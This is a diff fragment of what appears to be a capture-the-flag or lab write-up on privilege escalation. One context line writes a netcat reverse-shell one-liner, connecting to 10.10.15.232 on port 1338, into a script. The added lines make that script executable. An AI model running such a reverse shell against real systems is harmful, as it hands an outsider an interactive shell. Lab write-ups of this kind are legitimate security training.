@@ -458,3 +458,9 @@ Now ill create the script
 dev@store:/opt/google/chrome$ echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.15.232 1338 >/tmp/f' > ../../../home/dev/privesc.sh
 ```
 
+Now ive made the script ill make it executable
+
+```python
+chmod +x ../../../home/dev/privesc.sh
+```
+
